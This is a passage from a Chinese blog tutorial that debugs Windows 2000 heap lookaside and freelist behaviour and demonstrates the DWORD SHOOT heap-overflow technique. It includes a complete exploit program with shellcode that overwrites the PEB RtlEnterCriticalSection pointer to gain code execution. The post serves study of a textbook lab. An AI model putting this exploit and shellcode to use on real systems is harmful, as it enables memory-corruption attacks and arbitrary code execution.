+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920151907615.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920151907615.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220920151907615"></p>
+<p>h1的指针占用了h2data的前4个字节,但是没关系,再申请8字节的堆空间的时候,直接从Lookaside[1]拉的链上把最后面一个摘下来,前面的data就不用存最后这个的指针了</p>
+<h4 id="四次释放完毕后"><a href="#四次释放完毕后" class="headerlink" title="四次释放完毕后"></a>四次释放完毕后</h4><p>将从尾块上割下来的h1,2,3,4都释放了,他们都会挂在lookaside上</p>
+<p>画到图上是这样的</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920152300952.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920152300952.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220920152300952"></p>
+<h4 id="从快表分配"><a href="#从快表分配" class="headerlink" title="从快表分配"></a>从快表分配</h4><p>四次分配释放完成后,实际上干了一个瓜分尾块到快表的事,下面又要进行分配了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">16</span>);</span><br></pre></td></tr></table></figure>
+<p>16字节,正好Lookaside[2]上面挂着一个h3@361EB0,这个幸运儿又要得到程序的重用了</p>
+<p>不出所料,调用HeapAlloc函数,返回之后,eax中的句柄值为0x361EB0</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920152553906.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920152553906.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220920152553906"></p>
+<p>到这里去看看</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920152632807.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920152632807.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220920152632807"></p>
+<p>SelfSize=0x0003(单位8字节),即堆块首8字节+data16字节=24字节</p>
+<p>flags=0x01,占用状态</p>
+<p>再到Lookaside[2]@0x360718看看</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920152821163.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920152821163.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="一夜回到解放前"></p>
+<p>Lookaside[1]@3606E8还有Lookaside[3]@360748都没有发生变化,唯独Lookaside[2]@0x360718一夜回到解放前了</p>
+<h2 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h2><p>finally,可以搞点事情了</p>
+<h3 id="DWORD-SHOOT"><a href="#DWORD-SHOOT" class="headerlink" title="DWORD SHOOT"></a>DWORD SHOOT</h3><p>“双字射击”</p>
+<p>构造数据,溢出下一个堆块的块首,改写该堆块中的前向指针flink,后向指针blink,在分配,释放,合并等操作时司机获得一次想内存任意地址写入任意数据的机会</p>
+<p>为啥叫做”DWORD SHOOT”呢?</p>
+<p>“DWORD”是因为攻击负载是一个双字,后面就看到了</p>
+<p>“SHOOT”是因为这种攻击类似于狙击,只有一次机会,不是栈溢出的大水漫灌</p>
+<p><strong>如何发生?</strong></p>
+<p>考虑我们自己写一个双向的链表ADT时,释放其中一个节点应该怎么写?</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920154638925.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920154638925.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220920154638925"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line">	Node *flink;</span><br><span class="line">	Node *blink;</span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">delet</span><span class="params">(Node *node)</span>&#123;</span><br><span class="line">    node-&gt;blink-&gt;flink=node-&gt;flink;<span class="comment">//后节点的前指针指向当前节点的前节点</span></span><br><span class="line">    node-&gt;flink-&gt;blink=node-&gt;flink;<span class="comment">//前节点的后指针指向当前节点的后节点</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后篡改node节点的前后指针</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920155918456.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920155918456.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220920155918456"></p>
+<p>然而这都是猜想,windows开发者怎么写的现在我们不知道,下面调试观察是不是这样</p>
+<h3 id="调试分配时DWORD-SHOOT"><a href="#调试分配时DWORD-SHOOT" class="headerlink" title="调试分配时DWORD SHOOT"></a>调试分配时DWORD SHOOT</h3><p>调试程序是这样的</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">	HLOCAL h1, h2,h3,h4,h5,h6;</span><br><span class="line">	HANDLE hp;</span><br><span class="line">	hp = HeapCreate(<span class="number">0</span>,<span class="number">0x1000</span>,<span class="number">0x10000</span>);<span class="comment">//一开始时申请0x1000个字节的堆空间,最大能够申请0x10000个字节</span></span><br><span class="line">	h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);<span class="comment">//希望申请8个字节,实际上从尾块瓜分16字节空间</span></span><br><span class="line">	h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">	h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">	h4 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">	h5 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">	h6 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);<span class="comment">//连续从尾块上瓜分16*6=96字节空间</span></span><br><span class="line"></span><br><span class="line">	_asm <span class="type">int</span> <span class="number">3</span>	<span class="comment">//used to break the process//在此中断附加调试器</span></span><br><span class="line">	<span class="comment">//free the odd blocks to prevent coalesing</span></span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h1); <span class="comment">//释放奇数块,避免合并</span></span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h3); </span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h5); <span class="comment">//now freelist[2] got 3 entries//现在空表freelist[2]后面托着3油瓶</span></span><br><span class="line">    <span class="comment">//后来的直接头插法接到freelist[2]后面,后来的先分配</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">//will allocate from freelist[2] which means unlink the last entry (h5)</span></span><br><span class="line">	h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>); <span class="comment">//再申请8字节,要把刚才释放的h5要回来</span></span><br><span class="line">		</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>在win2k上,发行版的程序在INT3之后报错,此时附加od进行调试</p>
+<h4 id="六次HeapAlloc之后"><a href="#六次HeapAlloc之后" class="headerlink" title="六次HeapAlloc之后"></a>六次HeapAlloc之后</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920161251631.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920161251631.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220920161251631"></p>
+<p>此时程序刚执行了最后一个HeapAlloc,eax中还保存着句柄h6=0x5206D8</p>
+<p>可以推测,堆区在0x520000,在内存映射视图中观察,确实如此</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920161424952.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920161424952.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220920161424952"></p>
+<p>6次HeapAlloc都是瓜分的尾块</p>
+<p>尾块现在的位置应该是位于h6的下面</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920161542418.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920161542418.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220920161542418"></p>
+<p>h6块首@0x5206D0</p>
+<p>h6data@0x5206D8</p>
+<p>确实如此,尾块@0x526E8,两个指针都是指向Freelist[0]@0x520178</p>
+<p>尾块首@0x5206E0.</p>
+<h4 id="h1-3-5释放之后"><a href="#h1-3-5释放之后" class="headerlink" title="h1,3,5释放之后"></a>h1,3,5释放之后</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Freelist[0]@00520178  E8 06 52 00 E8 06 52 00  ?R.?R.</span><br><span class="line">Freelist[1]@00520180  80 01 52 00 80 01 52 00  €R.€R.</span><br><span class="line">Freelist[2]@00520188  88 06 52 00 C8 06 52 00  ?R.?R.</span><br><span class="line">Freelist[3]@00520190  90 01 52 00 90 01 52 00  ?R.?R.</span><br><span class="line">Freelist[4]@00520198  98 01 52 00 98 01 52 00  ?R.?R.</span><br><span class="line">Freelist[5]@005201A0  A0 01 52 00 A0 01 52 00  ?R.?R.</span><br></pre></td></tr></table></figure>
+<p>其中Freelist[0]两个指针都指向尾块,</p>
+<p>Freelist[2].flink=h1@0x00520688</p>
+<p>Freelist[2].blink=h5@0x005206C8</p>
+<p>在图上就是这么一个状态</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920162635151.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920162635151.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220920162635151"></p>
+<h4 id="篡改h5的两个指针"><a href="#篡改h5的两个指针" class="headerlink" title="篡改h5的两个指针"></a>篡改h5的两个指针</h4><p>下一次分配<code>h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8);</code>将会把刚才释放的h5@0x005206C8再要回去,</p>
+<p>在要回去之前要修改h3还有Freelist[2]的指针</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920162918303.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920162918303.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220920162918303"></p>
+<p>在该次分配前,将h5的两个指针先改掉</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920163203070.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920163203070.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="修改之前"></p>
+<p>修改之后</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920163323743.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920163323743.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="修改之后"></p>
+<p>然后单步步过执行该分配函数,</p>
+<p>此时控制跳转到0x77CCAAD位置,这应该是在HeapAlloc库函数或者其调用函数中了</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920163836240.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920163836240.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220920163836240"></p>
+<p>尝试将ecx中的数据写到内存上ds:[EDX],ds即程序数据段选择子,此时ECX和EDX就是我们赋的两个值</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920163956631.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920163956631.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220920163956631"></p>
+<p>ollydbg已经报错</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920163624121.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920163624121.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="寄了"></p>
+<h3 id="利用DWORD-SHOOT"><a href="#利用DWORD-SHOOT" class="headerlink" title="利用DWORD SHOOT"></a>利用DWORD SHOOT</h3><blockquote>
+<p>利用点:</p>
+<p>内存变量</p>
+<p>代码逻辑</p>
+<p>返回地址</p>
+<p>异常处理机制</p>
+<p>函数指针</p>
+<p>PEB线程同步函数入口地址</p>
+</blockquote>
+<p>书上的实验选定受害者是RtlEnterCriticalSection函数指针</p>
+<p>该函数的作用是同步一个进程的不同线程,RtlEnterCriticalSection和RtlCriticalSection函数是访问临界区时需要调用的,保证线程对临界区的访问互斥</p>
+<p>进程退出时,ExitProcess函数会调用这两个临界区函数,但是调用方式是函数指针</p>
+<p>这两个函数指针在PEB+0x20处</p>
+<p>RtlEnterCriticalSection@0x7FFDF020</p>
+<p>RtlLeaveCriticalSection@0x7FFDF024</p>
+<h4 id="利用程序"><a href="#利用程序" class="headerlink" title="利用程序"></a>利用程序</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">//repaire the pointer which shooted by heap over run</span></span><br><span class="line"><span class="string">&quot;\xB8\x20\xF0\xFD\x7F&quot;</span>  <span class="comment">//MOV EAX,7FFDF020</span></span><br><span class="line"><span class="string">&quot;\xBB\x4C\xAA\xF8\x77&quot;</span>  <span class="comment">//MOV EBX,77F82060h the address here may releated to your OS</span></span><br><span class="line"><span class="string">&quot;\x89\x18&quot;</span>				<span class="comment">//MOV DWORD PTR DS:[EAX],EBX</span></span><br><span class="line"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line"><span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line"><span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line"><span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line"><span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line"><span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line"><span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x16\x01\x1A\x00\x00\x10\x00\x00&quot;</span><span class="comment">// head of the ajacent free block</span></span><br><span class="line"><span class="string">&quot;\x88\x06\x36\x00\x20\xf0\xfd\x7f&quot;</span>;</span><br><span class="line"><span class="comment">//0x00360688 is the address of shellcode in first heap block, you have to make sure this address via debug </span></span><br><span class="line"><span class="comment">//0x7ffdf020 is the position in PEB which hold a pointer to RtlEnterCriticalSection()</span></span><br><span class="line"><span class="comment">//and will be called by ExitProcess() at last</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">	HLOCAL h1 = <span class="number">0</span>, h2 = <span class="number">0</span>;</span><br><span class="line">	HANDLE hp;</span><br><span class="line">	hp = HeapCreate(<span class="number">0</span>,<span class="number">0x1000</span>,<span class="number">0x10000</span>);</span><br><span class="line">	h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">200</span>);</span><br><span class="line">	__asm <span class="type">int</span> <span class="number">3</span> <span class="comment">//used to break the process</span></span><br><span class="line">	<span class="comment">//memcpy(h1,shellcode,200); //normal cpy, used to watch the heap</span></span><br><span class="line">	<span class="built_in">memcpy</span>(h1,shellcode,<span class="number">0x200</span>); <span class="comment">//overflow,0x200=512</span></span><br><span class="line">	h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>h1向hp堆申请了200字节的空间,但是memcpy中却允许往里放0x200=512字节</p>
+<p>而h1后面紧跟着的就是尾块,如果往h1上写入多余200个字节,就把尾块溢出了</p>
+<p>将尾块的首部的指向Freelist[0]的两个指针溢出修改,再发生分配的时候就DWORD SHOOT了</p>
+<p>可以将PEB中的RtlEnterCriticalSection@0x7FFDF020这个指针修改为shellcode</p>
+<p>DWORDSHOOT之后堆异常,程序会调用ExitProcess结束进程</p>
+<p>ExitProcess会调用0x7FFDF020处的函数指针,但是这个指针已经被溢出成shellcode了,于是shellcode就执行了</p>
+<h4 id="调试观察"><a href="#调试观察" class="headerlink" title="调试观察"></a>调试观察</h4><p>int 3中断时,刚执行完<code>h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,200);</code></p>
+<p>eax=0x360688,即h1句柄,h1堆的大小200=0xC8字节,data占据了[0x360688,0x0x360750)</p>
+<p>那么尾块的首部就得在0x360750</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920211125615.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920211125615.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220920211125615"></p>
+<p>0x758开始的八个字节是尾块的两个指向Freelist[0]的指针</p>
+<p>然后是将shellcode拷贝到h1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00401026   B9 80000000      MOV ECX,80;重复拷贝次数,0x80次</span><br><span class="line">0040102B   BE 30604000      MOV ESI,heap_PEB.00406030;shellcode作为源地址</span><br><span class="line">00401030   8BF8             MOV EDI,EAX;h1-&gt;eax-&gt;edi作为目的地址</span><br><span class="line">00401037   F3:A5            REP MOVS DWORD PTR ES:[EDI],DWORD PTR DS:[ESI];每次从ESI指向的内存上拿出一个双字拷贝到edi指向的内存上</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>如此总共拷贝了0x80*4=512字节,显然要溢出尾块了.</p>
+<p>拷贝完成后再看尾块</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920212207155.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920212207155.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220920212207155"></p>
+<p>尾块的flink已经溢出修改为0x360688,这是shellcode的起始地址</p>
+<p>尾块的blink已经溢出修改成0x7F7D7020,这是PEB中线程同步函数指针的地址</p>
+<p>尾块首的前8字节溢出值仍然是合法的首部值,这是为了防止程序在DWORD SHOOT前寄掉,他真的,我哭死</p>
+<h4 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h4><p>shellcode有两个系统相关的数值,一个是NTDLL.DLL中RtlEnterCriticalSection这个函数的地址,这个可以使用dependency walker查</p>
+<p>另一个是shellcode将会被加载进入进程虚拟地址空间的哪里,这个可以先调试观察一次,然后修改shellcode</p>
+<p>使用内联汇编<strong>加载器</strong>加载shellcode,观察这段代码干了啥</p>
+<h5 id="修复PEB临界区控制函数"><a href="#修复PEB临界区控制函数" class="headerlink" title="修复PEB临界区控制函数"></a>修复PEB临界区控制函数</h5><p>由于shellcode执行之后,还需要调用RtlEnterCriticalSection这个函数指针,但是之前为了能够让shellcode执行,已经把这个函数指针改成了shellcode的地址,也就是说shellcode执行之后所有对RtlEnterCriticalSection函数的调用会重新执行shellcode,进行不下去了,这样弹不出窗口来,需要在shellcode起来之后,首先把RtlEnterCriticalSection的值改回去</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00424B08   mov         eax,7FFDF020h	;程序PEB中线程同步函数的地址 RtlEnterCriticalSection函数指针的位置.放到eax中</span><br><span class="line">00424B0D   mov         ebx,77F82060h	;NTDLL.DLL库中RtlEnterCriticalSection的地址,放到ebx中</span><br><span class="line">00424B12   mov         dword ptr [eax],ebx;将ebx值赋值到eax指向的内存地址,也就是把NTDLL.DLL中,RtlEnterCriticalSection函数地址放到了PEB中的函数指针上</span><br></pre></td></tr></table></figure>
+<h5 id="三层循环解析函数地址-弹窗"><a href="#三层循环解析函数地址-弹窗" class="headerlink" title="三层循环解析函数地址,弹窗"></a>三层循环解析函数地址,弹窗</h5><p>剩下的shellcode之前已经分析过了</p>
+
+      </div>
+      <div class="post-tags-categories">
+        
+        <div class="tags">
+          
+            <a href="/tags/windows-pwn/" class="">
+              windows pwn
+            </a>
+          
+        </div>
+        
+      </div>
+      
+    </article>
+    <!-- 上一篇文章和下一篇文章 -->
+    
+      <!-- 文章详情页的上一页和下一页 -->
+<div class="post-nav">
+
+
+
+
+
+  
+  <div class="post-nav-next post-nav-item">
+    <div class="post-nav-img" style="background-size: cover; 
+      background-position: center center;">
+      <img class="lazyload lazyload placeholder" src="/medias/6.jpg" class="lazyload placeholder" data-srcset="/medias/6.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" src="" alt="">
+    </div>
+    <a href="/2022/09/18/Bind-shell/" class="post-nav-link">
+      <div class="title">
+        Next: <i class="fas fa-angle-right"></i>
+        <div class="title-text">bindshell逆向分析</div>
+      </div>
+      <!-- <div class="content">
+        Bind_shell哈希算法设计1.哈希算法不能发生碰撞,或者说存在发生碰撞的可能,但是可以肯定的是,首先匹配的就是目标
+      </div> -->
+    </a>
+  </div>
+
+</div>
+
+    
+    
+
+    <!-- 打赏 -->
+    
+
+    <!-- 分享 -->
+    
+      <!-- https://github.com/overtrue/share.js -->
+<!-- 文章详情页的分享 -->
+<div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+
+<script src="/js/shareJs/social-share.min.js"></script>
+</script>
+
+<style>
+  .social-share {
+    margin: 20px 0;
+  }
+</style>
+
+
+    
+    
+    <!-- 评论 -->
+    <!-- 评论 -->
+
+  <div id="myComment">
+    
+      
+<section id="comments" style="padding: 1em; margin: 15px auto;"
+	class="animated bounceInUp">
+	<div id="vcomment" class="comment"></div>
+</section>
+<style>
+	#comments {
+		background: rgba(255,255,255,0.9);
+	}
+	#veditor {
+		background-image: url('https://raw.githubusercontent.com/DeutschBall/test/master/R.3c3e443dfe9ddbddc93730c482ed0461');
+		background-size: contain;
+		background-repeat: no-repeat;
+		background-position: right;
+		background-color: rgba(255, 255, 255, 0);
+		resize: vertical;
+	}
+	#veditor:focus{
+		background-position-y: 200px;
+		transition: all 0.2s ease-in-out 0s;
+	}
+	#vcomment .vcards .vcard .vh .vhead .vtag.vvisitor {
+		background-color: #42b983;
+	}
+	.v[data-class=v] .vbtn:active, .v[data-class=v] .vbtn:hover {
+		color: #42b983;
+		border-color: #42b983;
+	}
+	#vcomment .vcards .vcard .vhead .vsys i {
+		display: none;
+	}
+	/* 底部valine链接 */
+	#vcomment .vpower {
+		display: none;
+	}
+	
+	/* 底下注释是修改 名称和邮箱和网址输入框的样式 */
+	/* #vcomment .vheader {
+		display: flex;
+		justify-content: space-around;
+	}
+	
+	#vcomment .vheader .vnick {
+		width: 31%;
+		border: 2px solid #dedede;
+		padding-left: 10px;
+		padding-right: 10px;
+		border-radius: 5px
+	}
+
+	#vcomment .vheader .vmail {
+		width: 31%;
+		border: 2px solid #dedede;
+		padding-left: 10px;
+		padding-right: 10px;
+		border-radius: 5px
+	}
+
+	#vcomment .vheader .vlink {
+		width: 31%;
+		border: 2px solid #dedede;
+		padding-left: 10px;
+		padding-right: 10px;
+		border-radius: 5px
+	} */
+
+	img.vimg {
+		transition: all 1s;
+		/* 头像旋转时间为 1s */
+	}
+
+	img.vimg:hover {
+		transform: rotate(360deg);
+		-webkit-transform: rotate(360deg);
+		-moz-transform: rotate(360deg);
+		-o-transform: rotate(360deg);
+		-ms-transform: rotate(360deg);
+	}
+
+	#vcomment .vcards .vcard {
+		padding: 15px 20px 0 20px;
+		border-radius: 10px;
+		margin-bottom: 15px;
+		box-shadow: 0 0 4px 1px rgba(0, 0, 0, .12);
+		transition: all .3s
+	}
+
+	#vcomment .vcards .vcard:hover {
+		box-shadow: 0 0 8px 3px rgba(0, 0, 0, .12)
+	}
+
+	#vcomment .vcards .vcard .vh .vcard {
+		border: none;
+		box-shadow: none;
+	}
+</style>
+    
+  </div>
+
+<!-- comment script in themes\hexo-theme-bamboo\layout\_partial\scripts\index.ejs -->
+
+
+  </div>
+
+  <!-- 目录 -->
+  <!-- 文章详情页右侧目录 -->
+
+  <div class="toc-aside">
+    <div class="toc-main">
+      <div class="toc-aside-title">
+        <i class="fas fa-list-ul" aria-hidden="true"></i><span>catalog</span>
+        
+          <div class="toc-open-close">catalog</div>
+        
+      </div>
+      <div class="toc-content">
+        <div class="toc"></div>
+      </div>
+    </div>
+  </div>
+
